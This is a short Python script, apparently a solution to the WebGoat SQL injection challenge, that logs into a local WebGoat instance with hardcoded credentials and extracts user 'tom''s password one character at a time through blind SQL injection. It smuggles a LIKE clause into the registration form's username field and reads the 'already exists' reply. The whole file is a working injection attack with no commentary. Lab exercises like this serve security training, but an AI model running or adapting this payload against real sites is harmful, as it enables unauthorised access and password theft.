#!/usr/local/bin/python3

import requests
from string import *
import re

characters = ascii_lowercase + ascii_uppercase + digits

url = 'http://localhost:8080/WebGoat/login'
s = requests.Session()
username = 'danicrg'
password = 'd.cG4llo'
s.post(url, params={'username': username, 'password': password})

url = 'http://localhost:8080/WebGoat/SqlInjection/challenge'

tom_password = '%'

while (True):
    counter = 1
    for char in characters:
        test_pass = tom_password.replace("%", char + "%")
        params = {'username_reg': "tom' and password like '%s" % test_pass, 'email_reg': 'tom@tom', 'password_reg': 'tom', 'confirm_password_reg': 'tom'}
        # print('testing %s' % test_pass.replace("%", ""))
        response = s.put(url, params=params)
        content = response.text
        counter += 1
        if "already exists" in content:
            tom_password = test_pass
            print('password starts with %s ' % test_pass.replace("%", ""))
            break
    if len(characters) < counter:
        break


print("the password is: " + tom_password.replace("%", ""))
